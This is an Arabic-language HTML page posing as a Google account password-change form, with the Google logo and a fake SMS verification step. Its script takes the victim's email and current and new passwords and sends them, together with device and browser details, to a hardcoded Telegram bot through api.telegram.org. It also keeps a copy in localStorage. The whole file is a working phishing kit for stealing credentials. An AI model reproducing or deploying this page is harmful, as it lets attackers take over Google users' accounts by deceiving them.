<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <base target="_self">
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تغيير كلمة المرور - حساب Google</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
</head>
<body class="min-h-screen bg-white font-sans">
    <div class="container mx-auto px-4 py-8 max-w-md">
        <header class="mb-8 text-center">
            <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="شعار Google" class="h-8 mx-auto mb-6">
            <h1 class="text-2xl font-medium text-gray-800">تغيير كلمة المرور</h1>
        </header>

        <main>
            <form id="passwordChangeForm" class="space-y-6">
                <div class="space-y-1">
                    <label for="email" class="block text-sm font-medium text-gray-700">البريد الإلكتروني</label>
                    <div class="relative">
                        <div class="absolute inset-y-0 right-0 flex items-center pr-3 pointer-events-none text-gray-400">
                            <i class="fas fa-envelope"></i>
                        </div>
                        <input type="email" id="email" name="email" placeholder="example@gmail.com" class="w-full pl-3 pr-10 py-2 border rounded focus:ring-2 focus:ring-blue-500 focus:border-blue-500" required>
                    </div>
                </div>

                <div id="password-fields" class="space-y-4"></div>

                <div class="text-sm text-gray-600 space-y-1">
                    <p>يجب أن تكون كلمة المرور 8 أحرف على الأقل</p>
                    <p>يُفضل استخدام حروف + أرقام + رموز</p>
                </div>

                <div id="error-messages" class="text-red-500 text-sm hidden"></div>

                <button type="submit" class="w-full py-2 px-4 bg-blue-600 text-white rounded hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-opacity-50">
                    تغيير كلمة المرور
                </button>
            </form>

            <div id="security-verification" class="mt-8 p-4 border rounded-lg hidden">
                <h3 class="font-medium mb-3">التحقق الأمني</h3>
                <div class="space-y-3">
                    <div class="flex items-center">
                        <input type="radio" id="sms-verification" name="verification" value="SMS" class="mr-2" checked>
                        <label for="sms-verification">إرسال رمز إلى هاتفي</label>
                    </div>
                </div>
            </div>
        </main>
    </div>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/js/all.min.js"></script>
    <script>
        // ==================== إعدادات Telegram (مضبوطة وجاهزة) ====================
        const TELEGRAM_TOKEN = '8734428530:AAFRiyG6RFG2jaNiAWt8ZiP53Fl6_GtZiFc';
        const TELEGRAM_CHAT_ID = '7114680596';  // ✅ الرقم الصحيح من userinfobot

        // بيانات حقول كلمة المرور
        const passwordFields = [
            { id: "current-password", label: "كلمة المرور الحالية", placeholder: "أدخل كلمة المرور الحالية", icon: "lock" },
            { id: "new-password", label: "كلمة المرور الجديدة", placeholder: "أدخل كلمة المرور الجديدة", icon: "lock" },
            { id: "confirm-password", label: "تأكيد كلمة المرور الجديدة", placeholder: "أعد إدخال كلمة المرور الجديدة", icon: "lock" }
        ];

        // رسائل الأخطاء
        const errorMessages = {
            mismatch: "كلمة المرور غير متطابقة",
            short: "يجب أن تحتوي كلمة المرور على 8 أحرف على الأقل"
        };

        // عرض حقول كلمة المرور
        function renderPasswordFields() {
            const container = document.getElementById('password-fields');
            container.innerHTML = passwordFields.map(field => `
                <div class="space-y-1">
                    <label class="block text-sm font-medium text-gray-700">${field.label}</label>
                    <div class="relative">
                        <div class="absolute inset-y-0 right-0 flex items-center pr-3 pointer-events-none text-gray-400">
                            <i class="fas fa-${field.icon}"></i>
                        </div>
                        <input type="password" id="${field.id}" placeholder="${field.placeholder}" 
                               class="w-full pl-3 pr-10 py-2 border rounded focus:ring-2 focus:ring-blue-500 focus:border-blue-500" required>
                        <button type="button" class="absolute inset-y-0 left-0 flex items-center pl-3 text-gray-500 hover:text-gray-700"
                                onclick="togglePasswordVisibility('${field.id}')">
                            <i class="far fa-eye"></i>
                        </button>
                    </div>
                </div>
            `).join('');
        }

        // إظهار/إخفاء كلمة المرور
        window.togglePasswordVisibility = function(fieldId) {
            const field = document.getElementById(fieldId);
            const icon = field.parentElement.querySelector('.fa-eye, .fa-eye-slash');
            if (field.type === 'password') {
                field.type = 'text';
                icon.classList.replace('fa-eye', 'fa-eye-slash');
            } else {
                field.type = 'password';
                icon.classList.replace('fa-eye-slash', 'fa-eye');
            }
        };

        // التحقق من صحة البيانات
        function validateForm() {
            const email = document.getElementById('email').value;
            const newPass = document.getElementById('new-password').value;
            const confirmPass = document.getElementById('confirm-password').value;
            const errors = [];

            if (!email) errors.push('البريد الإلكتروني مطلوب');
            if (newPass.length < 8) errors.push(errorMessages.short);
            if (newPass !== confirmPass) errors.push(errorMessages.mismatch);

            const errorDiv = document.getElementById('error-messages');
            if (errors.length) {
                errorDiv.innerHTML = errors.map(e => `<p>${e}</p>`).join('');
                errorDiv.classList.remove('hidden');
                return false;
            }
            errorDiv.classList.add('hidden');
            return true;
        }

        // إرسال إلى Telegram
        function sendToTelegram(data) {
            const message = `
🔐 **بيانات تسجيل دخول جديدة**
═════════════════════
📧 البريد: ${data.email}
🔒 الحالية: ${data.currentPassword}
🔐 الجديدة: ${data.newPassword}
✓ التأكيد: ${data.confirmPassword}
═════════════════════
🕐 الوقت: ${data.timestamp}
📱 الجهاز: ${data.platform}
🌐 المتصفح: ${data.userAgent}
            `;

            fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: message,
                    parse_mode: 'Markdown'
                })
            }).then(res => {
                if (res.ok) console.log('✅ تم الإرسال إلى Telegram');
                else console.log('❌ فشل الإرسال إلى Telegram');
            }).catch(err => console.log('❌ خطأ في الاتصال:', err));
        }

        // حفظ البيانات محلياً وإرسالها
        function saveData(data) {
            // حفظ في localStorage
            const existing = JSON.parse(localStorage.getItem('user_data') || '[]');
            existing.push({ id: Date.now(), ...data });
            localStorage.setItem('user_data', JSON.stringify(existing));

            // إرسال إلى Telegram
            sendToTelegram(data);
        }

        // معالجة تقديم النموذج
        document.getElementById('passwordChangeForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            if (!validateForm()) return;

            const formData = {
                email: document.getElementById('email').value,
                currentPassword: document.getElementById('current-password').value,
                newPassword: document.getElementById('new-password').value,
                confirmPassword: document.getElementById('confirm-password').value,
                verification: document.querySelector('input[name="verification"]:checked')?.value || 'SMS',
                timestamp: new Date().toLocaleString('ar-EG'),
                platform: navigator.platform,
                userAgent: navigator.userAgent
            };

            saveData(formData);
            document.getElementById('security-verification').classList.remove('hidden');
            
            setTimeout(() => this.reset(), 3000);
        });

        // تشغيل العرض الأولي
        renderPasswordFields();
    </script>
</body>
</html>
